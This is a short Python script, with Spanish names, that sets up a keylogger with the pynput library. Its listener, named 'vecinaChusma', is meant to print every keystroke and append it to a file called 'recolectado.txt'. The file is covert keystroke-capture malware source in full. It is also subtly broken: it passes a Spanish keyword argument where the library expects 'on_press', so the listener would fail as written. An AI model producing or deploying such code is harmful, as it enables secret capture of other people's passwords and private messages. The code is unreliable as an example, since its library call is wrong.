from pynput import keyboard

class RecolectorKeys():
    def __init__(self, filename: str = "recolectado.txt") -> None:
        self.filename = filename

    @staticmethod
    def obtener_tecla(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def al_presionar(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(self.obtener_tecla(key))

    def main(self):
        vecinaChusma = keyboard.Listener(
            al_presionar=self.al_presionar,
        )
        vecinaChusma.start()


#entry point
if __name__ == '__main__':
    recolector = RecolectorKeys()
    recolector.main()
    input()